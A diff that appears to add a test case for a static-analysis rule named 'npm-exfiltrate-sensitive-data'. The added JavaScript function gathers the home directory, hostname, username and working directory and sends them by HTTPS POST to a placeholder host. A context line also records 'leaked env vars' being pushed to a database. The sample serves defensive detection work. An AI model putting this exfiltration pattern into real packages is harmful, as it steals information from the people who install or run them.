@@ -80,3 +80,36 @@ function f(){
     dbRef.push({status : "leaked env vars", message : "anymsg"}, clean());
 
 }
+
+function f(){
+    os = require('fs');
+    https = require('https');
+    const td = {
+        c: __dirname,
+        hd: os.homedir(),
+        hn: os.hostname(),
+        un: os.userInfo().username,
+    }
+    const trackingData = JSON.stringify(td);
+    var postData = querystring.stringify({
+        msg: trackingData,
+    });
+
+    var options = {
+        hostname: "xx",
+        port: 443,
+        path: "/",
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": postData.length,
+        },
+    };
+
+    // ruleid: npm-exfiltrate-sensitive-data
+    var req = https.request(options, (res) => {
+        res.on("data", (d) => {
+            //process.stdout.write(d);
+        });
+    });
+}
